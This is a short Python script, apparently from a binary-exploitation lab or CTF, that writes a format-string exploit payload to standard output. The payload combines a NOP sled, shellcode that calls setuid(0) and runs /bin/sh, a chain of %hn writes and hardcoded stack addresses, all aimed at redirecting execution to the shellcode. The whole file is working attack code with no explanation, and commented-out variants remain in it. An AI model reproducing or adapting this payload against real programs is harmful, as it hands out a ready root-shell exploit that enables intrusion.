import sys
import os
NOPSLED = b'\x90' * 0x9
SHELLCODE  = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
SHELLCODE2 = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"


ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
ADDRESSOFSHELL.reverse()
ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') + 0xD248
ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[4:6], 'little')
ADDRESSOFSHELL3 = int.from_bytes(ADDRESSOFSHELL[2:4], 'little')
ADDRESSOFSHELL4 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little')
ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')
ADDRESSOFSHELL3 = bytes(str(ADDRESSOFSHELL3), 'utf-8')
ADDRESSOFSHELL4 = bytes(str(ADDRESSOFSHELL4), 'utf-8')

#ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540
#ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1 - 2540
#ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
#ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')
ADDRESSTOWRITE = b'007FFFFFFFD380'

ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(8, 'little')
ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(8, 'little')
ADDRESSTOWRITE3 = int(ADDRESSTOWRITE, 16) + 0X4
ADDRESSTOWRITE3 = ADDRESSTOWRITE3.to_bytes(8, 'little')
ADDRESSTOWRITE4 = int(ADDRESSTOWRITE, 16) + 0X6
ADDRESSTOWRITE4 = ADDRESSTOWRITE4.to_bytes(8, 'little')

ADDRESSOFSTRING = b'007FFFFFFFD8A8'
ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
LENTGHOFREQUIRED = 316

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(NOPSLED + SHELLCODE2 + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' b'%' + b'10106' + b'x' + b'%hn' + b'%' + b'32768x' + b'%hn' + b'%' + b'32769x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
    #b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + ADDRESSOFSHELL3 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL4 + b'x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')